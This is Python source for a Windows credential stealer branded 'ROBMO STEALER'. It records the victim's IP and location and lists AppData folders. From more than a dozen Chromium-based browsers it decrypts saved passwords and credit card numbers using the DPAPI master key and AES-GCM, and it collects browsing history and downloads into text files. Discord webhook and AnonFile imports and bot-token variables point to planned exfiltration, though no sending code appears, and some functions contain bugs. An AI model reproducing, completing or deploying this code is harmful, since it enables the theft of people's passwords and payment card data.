import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir, walk
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import discord
import win32crypt
import shutil
import command
import random
import threading
import re
import wmi
import uuid
import textwrap
import psutil
import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from json import loads
from regex import findall
import platform
import time
from pathlib import Path
import codecs
import json
import base64
from addict import Dict
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import winreg as reg
from urllib.request import Request, urlopen
import winreg
from anonfile import AnonFile
import getpass
import zipfile
import win32clipboard
import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

#SOURCES

intro = """
╔════════════════════════════════════════════════╗

   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
   
╚════════════════════════════════════════════════╝
"""

robmo = """\n\n▂ ▃ ▄ ▅ ▆ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ▇ ▆ ▅ ▄ ▃ ▂\n\n"""

bot_token = ""
chat_id = -131312321323123123

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

space = "\n"

user = os.path.expanduser("~")

user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫 𝟏")

if not os.path.exists(user_folder):
    os.mkdir(user_folder)
    
app_data_folder = os.path.join(user_folder, "𝐀𝐩𝐩𝐝𝐚𝐭𝐚")

if not os.path.exists(app_data_folder):
    os.makedirs(app_data_folder)
    
browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")



# ROAMING FOLDER

folder_roaming = [name for name in os.listdir(roaming) if os.path.isdir(os.path.join(roaming, name))]

total_roaming = len(folder_roaming)

roaming_txt = os.path.join(app_data_folder, "𝐑𝐨𝐚𝐦𝐢𝐧𝐠.txt")

with open(roaming_txt, "w", encoding="utf-8") as archive:
    archive.write(intro)
    archive.write(robmo)
    archive.write("𝚁𝚘𝚊𝚖𝚒𝚗𝚐 𝙵𝚘𝚕𝚍𝚎𝚛𝚜:\n \n")
    for folder in folder_roaming:
        archive.write("➤ ")
        archive.write(folder + "\n")
    archive.write(robmo)
    archive.write(f"𝚃𝚘𝚝𝚊𝚕 𝙵𝚘𝚕𝚍𝚎𝚛𝚜: {total_roaming}")

# LOCAL FOLDER 𝐋𝐨𝐜𝐚𝐥 𝐀𝐩𝐩𝐝𝐚𝐭𝐚 𝐑𝐨𝐚𝐦𝐢𝐧𝐠 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨 𝐋𝐨𝐜𝐚𝐥 𝐀𝐩𝐩𝐝𝐚𝐭𝐚 𝐑𝐨𝐚𝐦𝐢𝐧𝐠 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨 𝐔𝐬𝐞𝐫𝟏

folder_local = [name for name in os.listdir(local) if os.path.isdir(os.path.join(local, name))]

total_local = len(folder_local)

local_txt = os.path.join(app_data_folder, "𝐋𝐨𝐜𝐚𝐥.txt")

with open(local_txt, "w", encoding="utf-8") as archive:
    archive.write(intro)
    archive.write(robmo)
    archive.write("𝙻𝚘𝚌𝚊𝚕 𝙵𝚘𝚕𝚍𝚎𝚛𝚜:\n\n")
    for folder in folder_local:
        archive.write("➤ ")
        archive.write(folder + "\n")
    archive.write(robmo)
    archive.write(f"𝚃𝚘𝚝𝚊𝚕 𝙵𝚘𝚕𝚍𝚎𝚛𝚜: {total_local}")

#USER INFO

def getip():
    ip = "None"
    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()    
    return ip

def globalinfo():
    ip = getip()
    
    username = os.getenv("USERNAME")

    ipdatajson = urlopen(Request(f"https://ipinfo.io/json")).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(ipdatajson)

    city = ipdata["city"]
    region = ipdata["region"]
    country = ipdata["country"]
    timezone = ipdata["timezone"]

    now = datetime.now()
    date = now.strftime("%Y-%m-%d")
    time = now.strftime("%H:%M:%S")

    globalinfo = f"\n➤  𝚄𝚜𝚎𝚛: {username}\n➤  𝙸𝙿: {ip}\n➤  𝙲𝚒𝚝𝚢: {city}\n➤  𝚁𝚎𝚐𝚒𝚘𝚗: {region}\n➤  𝙲𝚘𝚞𝚗𝚝𝚛𝚢: {country}\n➤  𝚃𝚒𝚖𝚎𝚉𝚘𝚗𝚎: {timezone}\n➤  𝙳𝚊𝚝𝚎: {date}\n➤  𝚃𝚒𝚖𝚎: {time}"
        
    return globalinfo

def ginfo():
    user_info = globalinfo()
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)
    file_path = os.path.join(user_folder, "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨.txt")
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(intro.strip() + "\n" + robmo  + user_info)
ginfo()

#BROWSERS

def browser_txt(user_folder, browser_list):
    browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")
    if not os.path.exists(browser):
        os.makedirs(browser)
    browser_txt = os.path.join(browser, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬.txt")
    installed_browsers = [
        f"➤  {name}" for name, path in browser_list.items() if os.path.exists(path)
    ]
    if installed_browsers:
        with open(browser_txt, "w", encoding="utf-8") as file:
            file.write(intro)
            file.write(robmo)
            file.write("𝐈𝐧𝐬𝐭𝐚𝐥𝐥𝐞𝐝 𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬:\n\n")
            file.write("\n".join(installed_browsers))


browsers = {
    '𝐀𝐯𝐚𝐬𝐭': local + '\\AVAST\\Software Browser\\User Data',  
    '𝐂𝐡𝐫𝐨𝐦𝐞': local + '\\Google\\Chrome\\User Data',
    '𝐄𝐝𝐠𝐞': local + '\\Microsoft\\Edge\\User Data',
    '𝐁𝐫𝐚𝐯𝐞': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    #'𝐅𝐢𝐫𝐞𝐟𝐨𝐱': roaming + '\\Mozilla\\Firefox\\Profiles',
    #'𝐎𝐩𝐞𝐫𝐚': roaming + '\\Opera Software\\Opera Stable',
    '𝐓𝐨𝐫𝐜𝐡': local + '\\Torch\\User Data',
    '𝐊𝐨𝐦𝐞𝐭𝐚': local + '\\Kometa\\User Data',
    '𝐎𝐫𝐛𝐢𝐭𝐮𝐦': local + '\\Orbitum\\User Data',
    '𝐂𝐞𝐧𝐭𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\CentBrowser\\User Data',
    '𝐒𝐩𝐮𝐭𝐧𝐢𝐤': local + '\\Sputnik\\Sputnik\\User Data',
    '𝐕𝐢𝐯𝐚𝐥𝐝𝐢': local + '\\Vivaldi\\User Data',
    '𝐆𝐨𝐨𝐠𝐥𝐞-𝐂𝐡𝐫𝐨𝐦𝐞-𝐒𝐱𝐒': local + '\\Google\\Chrome SxS\\User Data', 
    '𝐄𝐩𝐢𝐜-𝐏𝐫𝐢𝐯𝐚𝐜𝐲-𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\Epic Privacy Browser',
    '𝐔𝐫𝐚𝐧': local + '\\uCozMedia\\Uran\\User Data',
    '𝐘𝐚𝐧𝐝𝐞𝐱': local + '\\Yandex\\YandexBrowser\\User Data',
    '𝐈𝐫𝐢𝐝𝐢𝐮𝐦': local + '\\Iridium\\User Data',
    #'𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': roaming + '\\Opera Software\\Opera GX Stable',
}

browser_txt(user_folder, browsers)

#DATA

data_queries = {
    '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬': {
        'query': 'SELECT origin_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['𝐔𝐑𝐋', '𝐔𝐬𝐞𝐫', '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝'],
        'decrypt': True
    },
    '𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝𝐬': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['𝐍𝐚𝐦𝐞 𝐎𝐧 𝐂𝐚𝐫𝐝', '𝐌𝐨𝐧𝐭𝐡', '𝐘𝐞𝐚𝐫', '𝐂𝐚𝐫𝐝 𝐍𝐮𝐦𝐛𝐞𝐫'],
        'decrypt': True
    },
    '𝐇𝐢𝐬𝐭𝐨𝐫𝐲': {
        'query': 'SELECT url, title FROM urls',
        'file': '\\History',
        'columns': ['𝐔𝐑𝐋', '𝐓𝐢𝐭𝐥𝐞'],
        'decrypt': False
    },
    '𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬 𝐔𝐑𝐋', '𝐋𝐨𝐜𝐚𝐥 𝐏𝐚𝐭𝐡'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(browser_name, type_of_data, content):
    user = os.path.expanduser("~")
    user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫 𝟏")
    browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", browser_name)
    if not os.path.exists(browser):
        os.makedirs(browser, exist_ok=True)
    
    if content is not None:
        file_path = os.path.join(browser, f"{type_of_data}.txt")
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(intro.strip() + "\n\n" + content)



def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type)
            save_results(browser, data_type_name, data)


